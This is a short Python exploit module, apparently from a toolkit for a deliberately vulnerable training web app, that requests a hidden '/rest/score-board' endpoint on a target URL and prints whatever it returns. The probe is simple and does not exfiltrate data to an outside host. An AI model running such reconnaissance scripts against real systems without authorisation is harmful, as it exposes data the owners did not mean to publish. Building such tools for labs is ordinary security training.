import requests

class ExposeScoreBoard:
    def __init__(self, target_url: str):
        self.target_url = target_url

    def run_exploit(self):
        print(f"[+] Running Expose Score Board on {self.target_url}")

        # Endpoint pour le tableau des scores
        endpoint = f"{self.target_url}/rest/score-board"

        try:
            response = requests.get(endpoint)
            if response.status_code == 200:
                print("[+] Successfully extracted Score Board data:")
                print(response.json())
            else:
                print(f"[-] Failed to access Score Board: {response.status_code}")
        except Exception as e:
            print(f"[!] Error during Expose Score Board: {e}")